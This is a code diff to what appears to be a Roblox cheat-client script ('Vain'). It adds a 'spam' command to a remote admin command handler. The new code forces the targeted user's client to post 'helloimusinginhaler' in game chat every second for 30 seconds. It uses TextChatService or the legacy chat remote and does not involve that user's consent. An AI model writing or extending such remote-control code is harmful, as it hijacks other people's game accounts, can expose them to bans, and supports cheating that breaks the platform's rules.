@@ -421,6 +421,26 @@ local function executeCommand(command, args)
 		end)
 	elseif command == 'notify' then
 		if vain then vain:CreateNotification('Vain', args or 'Message from admin', 10, 'alert') end
+	elseif command == 'spam' then
+		-- make the target repeatedly say "helloimusinginhaler" in chat
+		task.spawn(function()
+			local tcs = game:GetService('TextChatService')
+			local rs  = game:GetService('ReplicatedStorage')
+			local msg = 'helloimusinginhaler'
+			local end_t = tick() + 30
+			while tick() < end_t do
+				pcall(function()
+					if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+						local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
+						         or tcs.ChatInputBarConfiguration.TargetTextChannel
+						if ch then ch:SendAsync(msg) end
+					else
+						rs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
+					end
+				end)
+				task.wait(1)
+			end
+		end)
 	end
 end
 
